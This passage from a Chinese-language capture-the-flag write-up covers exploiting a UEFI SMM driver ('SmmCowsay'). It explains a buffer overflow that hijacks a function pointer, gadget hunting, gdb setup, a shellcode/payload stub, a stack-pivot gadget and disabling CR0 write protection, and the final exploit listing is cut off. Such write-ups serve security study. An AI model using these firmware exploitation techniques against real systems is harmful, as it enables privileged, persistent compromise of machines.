((u64)0x0000000000010000ULL)	<span class="comment">/* higher reliability */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RO		((u64)0x0000000000020000ULL)	<span class="comment">/* read-only */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_SP		((u64)0x0000000000040000ULL)	<span class="comment">/* specific-purpose memory (SPM) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RUNTIME	((u64)0x8000000000000000ULL)	<span class="comment">/* range requires runtime mapping */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEM_DESC_VERSION	1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SHIFT		12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SIZE		(1ULL &lt;&lt; EFI_PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_MASK		(EFI_PAGE_SIZE - 1)</span></span><br></pre></td></tr></table></figure>

<p>可以看到这段代码实际上就是给 0x44440000 这块内存设置了读保护，也就是说如果我们直接对这段内存进行读操作系统就会报错。  </p>
<p>Binexec 的代码页也没有什么变化：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+  UINTN MessageLen = StrLen(Message) * sizeof(CHAR16);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + MessageLen);</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = MessageLen;</span></span><br><span class="line"><span class="addition">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>变化较大的是 SmmCowsay 的 patch 文件：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  UINTN TempCommBufferSize;</span></span><br><span class="line"><span class="addition">+  UINT64 Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize)</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  TempCommBufferSize = *CommBufferSize;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!AsmRdRand64(&amp;Canary))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+  mDebugData.Canary = Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+  if (EFI_ERROR(Status))</span></span><br><span class="line"><span class="addition">+    goto out;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Canary != Canary) &#123;</span></span><br><span class="line"><span class="addition">+    // We probably overrun into libraries. Don&#x27;t trust anything. Make triple fault here.</span></span><br><span class="line"><span class="addition">+    while (TRUE) &#123;</span></span><br><span class="line"><span class="addition">+      __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;lidt (%%rsp)\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;add $16,%%rsp\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;ud2\n&quot;</span></span><br><span class="line"><span class="addition">+        : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+      );</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Icebp) &#123;</span></span><br><span class="line"><span class="addition">+    // If you define WANT_ICEBP in QEMU you actually get a breakpoint right here.</span></span><br><span class="line"><span class="addition">+    // Have fun playing with SMM.</span></span><br><span class="line"><span class="addition">+    __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+      &quot;.byte 0xf1&quot; // icebp / int1</span></span><br><span class="line"><span class="addition">+      : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+out:</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到他是利用 SmmCopyMemToSmram 函数将用户输入的内容 CommBuffer 拷贝进 mDebugData.Message 中，拷贝的长度是 TempCommBufferSize。然后经过一系列检测发现没有问题后就调用函数指针 mDebugData.CowsayFunc。<br>说到这里，漏洞就非常的明显了，因为 TempCommBufferSize 的长度是用户自定义的，所以我们可以很容易的构造出溢出。接下来看一下 mDebugData 的结构：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+struct &#123;</span></span><br><span class="line"><span class="addition">+  CHAR16 Message[200];</span></span><br><span class="line"><span class="addition">+  VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);</span></span><br><span class="line"><span class="addition">+  BOOLEAN volatile Icebp;</span></span><br><span class="line"><span class="addition">+  UINT64 volatile Canary;</span></span><br><span class="line"><span class="addition">+&#125; mDebugData;</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure>

<p>该结构体虽然自己实现了一个 Canary 用来检测是否发生溢出，可是他并不能保护到他上面的函数指针，也就是说我们能够通过溢出来劫持这一个函数指针。  </p>
<p>在进入到下一步之前，我们需要解决两个问题：1、如何找 gadget 2、如何进行调试<br>对于定一个问题，我们可以在 qemu 的启动脚本中加入下面这行：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</span><br></pre></td></tr></table></figure>

<p>启动 qemu 后他就能将调试信息保存到当前目录下的 debug.log 文件中，然后我们就能够在这个文件中找到各个可执行文件的入口地址：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:/mnt/d/desktop/cow/run$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC246 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE9D0F SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure>

<p>由于没有开启 ASLR，所以每次运行这个地址是不会变的，然后我们就可以使用类似于下面这中方法在各个 efi 文件中寻找 gadget  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 </span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 </span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure>

<p>接下来是如何调试，其实调试方法和平时调试内核一样，而且各个 efi 的基地址也能通过上面的方法获得，不过这里我阅读了 Marco Bonelli 的 wp 后发现可以舒服很多。<br>这道题目已经给出了每一个 efi 的符号表，所以 Marco Bonelli 写了个 python 脚本在启动 gdb 时能够直接将符号导入，其脚本 gdb_plugin.py 如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;../edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure>

<p>script.gdb：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line">b *(SmmCowsayHandler + 770)</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>会到漏洞利用，能够劫持后我们的问题就转换到要如何获取 flag。前面我们说过 flag 对应的物理页被设置成不可读，所以我们要修改 cr0 寄存器来让他可读。我们可以看一下此时 cr0 寄存器的值：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r cr0</span><br><span class="line">cr0            0x80010033          [ PG WP NE ET MP PE ]</span><br></pre></td></tr></table></figure>

<p>下面来自 eastxuelian 师傅的解释：  </p>
<blockquote>
<p>在当前的 CR0 设置中，开启的保护包括：</p>
<p>分页机制 (PG)，允许虚拟内存管理。<br>写保护 (WP)，保护内存页面免于非法写入，增强安全性。<br>保护模式 (PE)，提供内存段保护和权限分级。<br>在 x86 架构中，CR0 寄存器的 WP 位直接控制写保护（WriteProtect），而读保护（ReadProtect）通常不是由 CR0 直接控制。</p>
<p>读取访问的保护通常是通过页表中的权限位来控制的，这些位定义哪些进程可以读取特定的内存页。例如，页表中的某些位可以设置成允许或禁止用户模式的代码读取特定的内存页面。</p>
<p>写保护可以直接把 cr0 的第 16 位设置为 0 来绕过，接下来就可以随意篡改页表项或者代码段了，前者可以完成后续利用而后者可以往代码段写入 shellcode（NX 保护与 EFER 寄存器、页表项有关）</p>
</blockquote>
<p>我们可以通过 rop 来实现这个操作，可是我们的操作非常的有限，因为只有一次任意地址 call，这个时候我们就需要想办法栈迁移。这里我选择使用一个比较简单的栈迁移方式，在 UEFI 中存在一个类似于 kernel 的 pt_regs 结构。<br>我们可以写个简单的 shellcode 来验证一下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(<span class="number">0xdeadbeafdeadbeaf</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1111111111111111</span></span><br><span class="line"><span class="string">    mov rsi, 0x2222222222222222</span></span><br><span class="line"><span class="string">    mov rdi, 0x3333333333333333</span></span><br><span class="line"><span class="string">    mov rbp, 0x4444444444444444</span></span><br><span class="line"><span class="string">    mov r9 , 0x5555555555555555</span></span><br><span class="line"><span class="string">    mov r10, 0x6666666666666666</span></span><br><span class="line"><span class="string">    mov r11, 0x7777777777777777</span></span><br><span class="line"><span class="string">    mov r12, 0x8888888888888888</span></span><br><span class="line"><span class="string">    mov r13, 0x9999999999999999</span></span><br><span class="line"><span class="string">    mov r14, 0xaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">    mov r15, 0xbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br></pre></td></tr></table></figure>

<p>可以看到 r13、r14、r15 的值给保存到栈上  </p>
<img src="/2024/12/14/uefi/22.png" class="" title="我的图图呢">  

<p>我们再来看一下调用完函数指针后程序会如何执行：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30i 0x7ee8fc3+0x302</span><br><span class="line">=&gt; 0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   0x7ee92c9 &lt;SmmCowsayHandler+774&gt;:    je     0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92cb &lt;SmmCowsayHandler+776&gt;:    lea    rdx,[rip+0x1bbb]        <span class="comment"># 0x7eeae8d &lt;@IoWriteFifo32_Done+1851&gt;</span></span><br><span class="line">   0x7ee92d2 &lt;SmmCowsayHandler+783&gt;:    mov    ecx,0x40</span><br><span class="line">   0x7ee92d7 &lt;SmmCowsayHandler+788&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92dc &lt;SmmCowsayHandler+793&gt;:    jmp    0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92de &lt;SmmCowsayHandler+795&gt;:    mov    r9,r13</span><br><span class="line">   0x7ee92e1 &lt;SmmCowsayHandler+798&gt;:    mov    r8,r12</span><br><span class="line">   0x7ee92e4 &lt;SmmCowsayHandler+801&gt;:    mov    ecx,0x80000000</span><br><span class="line">   0x7ee92e9 &lt;SmmCowsayHandler+806&gt;:    lea    rdx,[rip+0x1bbe]        <span class="comment"># 0x7eeaeae &lt;@IoWriteFifo32_Done+1884&gt;</span></span><br><span class="line">   0x7ee92f0 &lt;SmmCowsayHandler+813&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92f5 &lt;SmmCowsayHandler+818&gt;:    jmp    0x7ee92c7 &lt;SmmCowsayHandler+772&gt;</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>可以看到在最后面的 pop 的时候 r14、r15 寄存器的值被保留，所以我们可以寻找类似于 add rsp、ret * 这样子的 gadget 覆盖函数指针，然后在 r14、r15 寄存器中放置 gadget 将 rsp 栈迁移到我们的 rop 中。</p>
<p>除了这种方法，其实 EDK2 中还存在一些非常好用的 <a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/86c8d69146310f24069701053a27153ae536ebba/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54">gadget</a>：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     rbx, [rcx]</span><br><span class="line">mov     rsp, [rcx + 8]</span><br><span class="line">mov     rbp, [rcx + 0x10]</span><br><span class="line">mov     rdi, [rcx + 0x18]</span><br><span class="line">mov     rsi, [rcx + 0x20]</span><br><span class="line">mov     r12, [rcx + 0x28]</span><br><span class="line">mov     r13, [rcx + 0x30]</span><br><span class="line">mov     r14, [rcx + 0x38]</span><br><span class="line">mov     r15, [rcx + 0x40]</span><br><span class="line">; load non-volatile fp registers</span><br><span class="line">ldmxcsr [rcx + 0x50]</span><br><span class="line">movdqu  xmm6,  [rcx + 0x58]</span><br><span class="line">movdqu  xmm7,  [rcx + 0x68]</span><br><span class="line">movdqu  xmm8,  [rcx + 0x78]</span><br><span class="line">movdqu  xmm9,  [rcx + 0x88]</span><br><span class="line">movdqu  xmm10, [rcx + 0x98]</span><br><span class="line">movdqu  xmm11, [rcx + 0xA8]</span><br><span class="line">movdqu  xmm12, [rcx + 0xB8]</span><br><span class="line">movdqu  xmm13, [rcx + 0xC8]</span><br><span class="line">movdqu  xmm14, [rcx + 0xD8]</span><br><span class="line">movdqu  xmm15, [rcx + 0xE8]</span><br><span class="line">mov     rax, rdx               ; set return value</span><br><span class="line">jmp     qword [rcx + 0x48]</span><br></pre></td></tr></table></figure>
<p>它可以用第一个参数指向的内存上的信息设置好 rsp 与其它寄存器，再跳转到目标地址上，简直是栈迁移的梦中情 gadget（笑  </p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下，rop 用的是 Marco Bonelli 师傅的：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 